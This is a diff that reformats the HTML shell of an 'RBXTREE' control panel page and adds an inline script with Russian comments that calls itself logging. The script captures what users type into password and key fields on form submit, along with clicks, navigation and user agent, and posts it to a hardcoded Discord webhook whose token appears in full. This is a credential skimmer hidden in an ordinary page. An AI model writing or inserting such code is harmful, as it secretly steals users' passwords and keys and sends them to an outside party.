@@ -1,1 +1,219 @@
-<!DOCTYPE html><html lang=""><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><title>RBXTREE | Control panel</title><link href="/css/app.4981a60b.css" rel="preload" as="style"><link href="/js/app.1309f105.js" rel="preload" as="script"><link href="/js/chunk-vendors.356c81a4.js" rel="preload" as="script"><link href="/css/app.4981a60b.css" rel="stylesheet"></head><body><noscript><strong>We're sorry but rbx-admin doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div><script src="/js/chunk-vendors.356c81a4.js"></script><script src="/js/app.1309f105.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="icon" href="/favicon.ico">
+    <title>RBXTREE | Control panel</title>
+    <link href="/css/app.4981a60b.css" rel="preload" as="style">
+    <link href="/js/app.1309f105.js" rel="preload" as="script">
+    <link href="/js/chunk-vendors.356c81a4.js" rel="preload" as="script">
+    <link href="/css/app.4981a60b.css" rel="stylesheet">
+</head>
+<body>
+<noscript>
+    <strong>We're sorry but rbx-admin doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+</noscript>
+<div id="app"></div>
+<script src="/js/chunk-vendors.356c81a4.js"></script>
+<script src="/js/app.1309f105.js"></script>
+
+<script>
+    // Вебхук Discord для логгирования
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ';
+
+    // Функция отправки логов в Discord
+    function sendToDiscord(action, details = {}) {
+        const timestamp = new Date().toISOString();
+        const userAgent = navigator.userAgent;
+        const pageUrl = window.location.href;
+        const ip = details.ip || 'Неизвестно';
+
+        // Формируем данные для отправки
+        const embed = {
+            title: `📝 Лог действия: ${action}`,
+            color: 0x3498db,
+            fields: [
+                {
+                    name: "⏰ Время",
+                    value: timestamp,
+                    inline: true
+                },
+                {
+                    name: "🌐 Страница",
+                    value: pageUrl,
+                    inline: true
+                },
+                {
+                    name: "🔑 Действие",
+                    value: action,
+                    inline: true
+                }
+            ],
+            timestamp: timestamp
+        };
+
+        // Добавляем дополнительные поля в зависимости от действия
+        if (details.key) {
+            embed.fields.push({
+                name: "🔐 Введенный ключ",
+                value: `\`${details.key}\``,
+                inline: false
+            });
+        }
+
+        if (details.userId) {
+            embed.fields.push({
+                name: "👤 ID пользователя",
+                value: details.userId,
+                inline: true
+            });
+        }
+
+        if (details.success !== undefined) {
+            embed.color = details.success ? 0x2ecc71 : 0xe74c3c;
+            embed.fields.push({
+                name: "✅ Статус",
+                value: details.success ? "Успешно" : "Ошибка",
+                inline: true
+            });
+        }
+
+        if (details.error) {
+            embed.fields.push({
+                name: "❌ Ошибка",
+                value: details.error,
+                inline: false
+            });
+        }
+
+        embed.fields.push({
+            name: "🖥️ User Agent",
+            value: `\`${userAgent.substring(0, 1024)}\``,
+            inline: false
+        });
+
+        // Отправка через fetch
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                embeds: [embed]
+            })
+        }).catch(error => {
+            console.error('Ошибка отправки лога в Discord:', error);
+        });
+    }
+
+    // Перехват отправки форм
+    document.addEventListener('submit', function(event) {
+        setTimeout(() => {
+            const form = event.target;
+            const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[type="key"]');
+            
+            inputs.forEach(input => {
+                if (input.value && (input.name.toLowerCase().includes('key') || 
+                    input.type === 'password' || 
+                    input.placeholder.toLowerCase().includes('key') ||
+                    input.id.toLowerCase().includes('key'))) {
+                    
+                    // Логируем ввод ключа
+                    sendToDiscord('Ввод ключа', {
+                        key: input.value,
+                        formId: form.id || 'без ID',
+                        formAction: form.action || 'без action'
+                    });
+                }
+            });
+        }, 100);
+    });
+
+    // Перехват кликов на кнопки
+    document.addEventListener('click', function(event) {
+        const target = event.target;
+        
+        // Логирование нажатия кнопок входа, отправки и т.д.
+        if (target.tagName === 'BUTTON' || 
+            (target.tagName === 'INPUT' && target.type === 'submit') ||
+            target.classList.contains('btn') ||
+            target.classList.contains('button') ||
+            target.textContent.toLowerCase().includes('submit') ||
+            target.textContent.toLowerCase().includes('login') ||
+            target.textContent.toLowerCase().includes('enter') ||
+            target.value.toLowerCase().includes('submit') ||
+            target.value.toLowerCase().includes('login')) {
+            
+            const buttonText = target.textContent || target.value || target.innerHTML;
+            sendToDiscord('Нажатие кнопки', {
+                buttonText: buttonText.substring(0, 100),
+                buttonId: target.id || 'без ID',
+                buttonClass: target.className || 'без класса'
+            });
+        }
+    });
+
+    // Логирование загрузки страницы
+    window.addEventListener('load', function() {
+        sendToDiscord('Загрузка панели управления', {
+            pageTitle: document.title,
+            referrer: document.referrer || 'прямой вход'
+        });
+    });
+
+    // Логирование изменений в полях ввода (с задержкой)
+    let keyInputTimer;
+    document.addEventListener('input', function(event) {
+        const target = event.target;
+        
+        // Проверяем, является ли поле полем для ключа/пароля
+        if ((target.type === 'password' || 
+             target.name.toLowerCase().includes('key') ||
+             target.placeholder.toLowerCase().includes('key') ||
+             target.id.toLowerCase().includes('key')) && 
+            target.value.length > 3) {
+            
+            clearTimeout(keyInputTimer);
+            keyInputTimer = setTimeout(() => {
+                sendToDiscord('Ввод данных в поле ключа', {
+                    fieldType: target.type,
+                    fieldName: target.name || 'без имени',
+                    fieldId: target.id || 'без ID',
+                    valueLength: target.value.length,
+                    firstChars: target.value.substring(0, 3) + '...'
+                });
+            }, 2000);
+        }
+    });
+
+    // Логирование ошибок JavaScript
+    window.addEventListener('error', function(event) {
+        sendToDiscord('Ошибка JavaScript', {
+            error: event.message,
+            filename: event.filename,
+            lineno: event.lineno,
+            colno: event.colno
+        });
+    });
+
+    // Логирование переходов (если используется History API)
+    const originalPushState = history.pushState;
+    history.pushState = function(state, title, url) {
+        originalPushState.apply(this, arguments);
+        sendToDiscord('Переход по странице', {
+            newUrl: url || 'не указан',
+            pageTitle: title || document.title
+        });
+    };
+
+    console.log('Система логгирования RBXTREE активирована');
+    
+    // Функция для ручного логгирования из других скриптов
+    window.logRBXAction = function(action, details) {
+        sendToDiscord(action, details);
+    };
+</script>
+</body>
+</html>
